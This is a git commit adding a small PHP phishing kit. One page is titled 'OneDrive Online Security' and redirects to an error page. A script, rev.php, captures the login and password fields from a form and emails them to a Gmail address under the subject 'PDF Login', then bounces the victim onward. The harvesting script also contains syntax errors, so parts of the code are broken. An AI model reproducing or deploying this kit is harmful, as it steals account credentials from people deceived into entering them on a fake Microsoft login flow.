63df896dfc9f0b7562fd7b5b1bbc28a5599446d0
wuploadlog <56212479+kwangojohn@users.noreply.github.com>
2020-04-06 04:23:43 -0700

    Add files via upload

---
+++ po.php
@@ -0,0 +1,18 @@
+<html>
+
+<head>
+
+<link rel="SHORTCUT ICON" href="files/favicon.ico"/>
+
+<title> OneDrive Online Security  For <?php echo $login ?> </title>
+<META http-equiv="refresh" content="2; url=error.php">
+</head>
+
+<body>
+
+
+	<img src="./files/pic.jpg" width="350" height="450">
+
+
+</body>
+</html>
---
+++ rev.php
@@ -0,0 +1,14 @@
+﻿<?php
+
+$message .= "--------------------+ Login Detail +--------------------;
+$message .= "User: ".$_POST['login'].;
+$message .= "Pass: ".$_POST['passwd'].;
+$message .= "-------------------- [User Information] --------------------";
+$POST = 'kwangojohn@gmail.com';
+$domain = 'kwangojohn@gmail.com';
+$subj = "PDF Login:|";
+$from = "From: 'kwangojohn@gmail.com';
+mail("kwangojohn@gmail.com",$subj,$message,$from,$domain,$POST);
+
+
+header("Location: ./po.php");
